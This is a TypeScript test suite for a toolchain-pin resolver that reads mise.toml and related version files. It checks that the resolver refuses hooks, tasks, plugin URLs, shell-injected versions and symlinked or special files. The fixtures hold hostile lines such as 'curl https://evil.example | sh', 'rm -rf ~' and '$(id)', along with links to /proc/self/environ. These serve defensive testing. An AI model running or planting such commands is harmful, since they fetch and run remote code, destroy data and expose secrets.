/**
 * Toolchain resolution (`T11.3`): the host reads a repository's pins itself, accepts only allowed tools and plain versions, and
 * reads no file through a link. Hostile files (`[env]` directives, hooks, tasks, plugin URLs, versions with shell characters) are
 * read as data and never acted on.
 */
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { MAX_BYTES, readToolchainFiles } from '../src/adapters/toolchain-files.ts'
import { readMiseToml, resolveToolchains } from '../src/domain/toolchains.ts'

const HOSTILE_MISE = `
# A repository's mise.toml, as a hostile committer would write it.
[env]
_.source = "./evil.sh"
EVIL = "{{ exec(command='touch /tmp/pwn') }}"
NOTE = """
[tools]
node = "1.0.0"
"""

[tools]
node = "22.12.0" # the real pin
python = '3.12'
ruby = "3.3"
"aqua:evil/tool" = "1.0"

[hooks]
enter = "touch /tmp/pwn-hook"
postinstall = "curl https://evil.example | sh"

[tasks.build]
run = "rm -rf ~"

[plugins]
node = "https://evil.example/plugin.git"

[settings]
python.compile = true
node.mirror_url = "https://evil.example/"
`

describe('reading mise.toml', () => {
  it('reads only [tools], skips a [tools] header inside a multi-line string, and never takes a directive as a pin', () => {
    expect(resolveToolchains({ 'mise.toml': HOSTILE_MISE })).toEqual({
      tools: [{ tool: 'node', version: '22.12.0', from: 'mise.toml' }, { tool: 'python', version: '3.12', from: 'mise.toml' }],
      ignored: ['mise.toml: "ruby" is not an allowed tool', 'mise.toml: "aqua:evil/tool" names a backend; only a tool\'s short name is read'],
      errors: [] })
  })

  it('refuses an allowed tool declared any way but a plain version string: hooks, arrays, tables, dotted keys, shell characters', () => {
    const errors = (text: string) => readMiseToml(text).errors
    expect(errors('[tools]\nnode = { version = "22", postinstall = "touch /tmp/pwn" }')).toEqual([expect.stringContaining('node must be a plain version string')])
    expect(errors('[tools]\nnode = ["22", "20"]')).toEqual([expect.stringContaining('node must be a plain version string')])
    expect(errors('[tools.node]\nversion = "22"')).toEqual([expect.stringContaining('[tools.node]')])
    expect(errors('tools.python = "3.12"\n')).toEqual([])
    expect(readMiseToml('tools.python = "3.12"\n').tools.get('python')).toBe('3.12')
    expect(errors('[tools]\nnode.version = "22"')).toEqual([expect.stringContaining('node must be declared as node = "<version>"')])
    expect(errors('[tools]\npython = "3.12; curl evil | sh"')).toEqual([expect.stringContaining('"3.12; curl evil | sh", which is not a plain version')])
    expect(errors('[tools]\npython = "$(id)"')).toEqual([expect.stringContaining('not a plain version')])
    expect(errors('[tools]\nnode = "lts"')).toEqual([expect.stringContaining('not a plain version')])
    expect(errors('[tools]\nnode = "latest"')).toEqual([expect.stringContaining('not a plain version')])
    expect(errors('[tools]\nnode = "\\u0032\\u0032"')).toEqual([expect.stringContaining('node must be a plain version string')])
    expect(errors('[tools]\nnode = """\n22\n"""')).toEqual([expect.stringContaining('node must be a plain version string')])
    expect(errors('[env]\nX = """\nnever closed')).toEqual([expect.stringContaining('multi-line string is not closed')])
    expect(errors('[tools]\nthis is not toml')).toEqual([expect.stringContaining('cannot read')])
  })

  it('reads quoted table names and keys, comments after values, and a v prefix', () => {
    expect(resolveToolchains({ 'mise.toml': '[ "tools" ]\n"go" = "v1.24.0"  # pinned\n' }).tools).toEqual([{ tool: 'go', version: '1.24.0', from: 'mise.toml' }])
  })
})

describe('the other pin files', () => {
  it('reads .tool-versions with asdf names and fallbacks, .python-version and .nvmrc', () => {
    expect(resolveToolchains({ '.tool-versions': '# pins\nnodejs 20.18.0 system\ngolang 1.24.0\nruby 3.3.0\n', '.python-version': '3.11\n3.10\n',
      '.nvmrc': 'v22.1.0\n' })).toEqual({
      tools: [{ tool: 'node', version: '20.18.0', from: '.tool-versions' }, { tool: 'python', version: '3.11', from: '.python-version' },
        { tool: 'go', version: '1.24.0', from: '.tool-versions' }],
      ignored: ['.tool-versions: "ruby" is not an allowed tool'], errors: [] })
  })

  it('refuses aliases and names it cannot pin, with the value shown printable and short', () => {
    expect(resolveToolchains({ '.nvmrc': 'lts/*' }).errors).toEqual(['.nvmrc: node is pinned to "lts/*", which is not a plain version (such as 3.12 or 22.12.0)'])
    expect(resolveToolchains({ '.python-version': 'system' }).errors).toEqual([expect.stringContaining('"system"')])
    expect(resolveToolchains({ '.python-version': `3.12\u001b[2J${'x'.repeat(100)}` }).errors[0]).toMatch(/"3\.12\?\[2Jx+…"/u)
    expect(resolveToolchains({ '.tool-versions': 'python\n' }).errors).toEqual(['.tool-versions: "python" names no version'])
  })

  it('takes mise.toml over .tool-versions over the one-version files, and the profile\'s defaults only for tools left unpinned', () => {
    const resolved = resolveToolchains({ 'mise.toml': '[tools]\npython = "3.13"', '.tool-versions': 'python 3.12\nnodejs 20', '.python-version': '3.11' },
      { python: '3.10', node: '18', uv: '0.9.5' })
    expect(resolved.tools).toEqual([{ tool: 'node', version: '20', from: '.tool-versions' }, { tool: 'python', version: '3.13', from: 'mise.toml' },
      { tool: 'uv', version: '0.9.5', from: 'profile' }])
    expect(resolveToolchains({}, { go: 'v1.24' }).tools).toEqual([{ tool: 'go', version: '1.24', from: 'profile' }])
  })
})

describe('reading the files from a worktree', () => {
  let dir: string
  beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'awb-toolchains-')) })
  afterEach(() => { rmSync(dir, { recursive: true, force: true }) })

  it('reads regular files and skips missing ones', () => {
    writeFileSync(join(dir, '.nvmrc'), '22\n')
    expect(readToolchainFiles(dir)).toEqual({ files: { '.nvmrc': '22\n' }, errors: [] })
  })

  it('refuses a link (to a secret outside the worktree), a FIFO without blocking, a directory and a large file, and reads none of them', () => {
    const secret = join(dir, 'secret')
    writeFileSync(secret, 'TOKEN=glpat-secret\n')
    const worktree = join(dir, 'wt')
    mkdirSync(worktree)
    symlinkSync(secret, join(worktree, '.nvmrc'))
    symlinkSync('/proc/self/environ', join(worktree, '.python-version'))
    execFileSync('mkfifo', [join(worktree, '.tool-versions')])
    mkdirSync(join(worktree, 'mise.toml'))
    const read = readToolchainFiles(worktree)
    expect(read.files).toEqual({})
    expect([...read.errors].sort()).toEqual(['.nvmrc is a symbolic link; it must be a regular file',
      '.python-version is a symbolic link; it must be a regular file', '.tool-versions is not a regular file', 'mise.toml is not a regular file'])
    expect(JSON.stringify(read)).not.toContain('glpat')
    rmSync(join(worktree, 'mise.toml'), { recursive: true })
    writeFileSync(join(worktree, 'mise.toml'), 'x'.repeat(MAX_BYTES + 1))
    expect(readToolchainFiles(worktree).errors).toContain(`mise.toml is larger than ${MAX_BYTES} bytes`)
  })
})
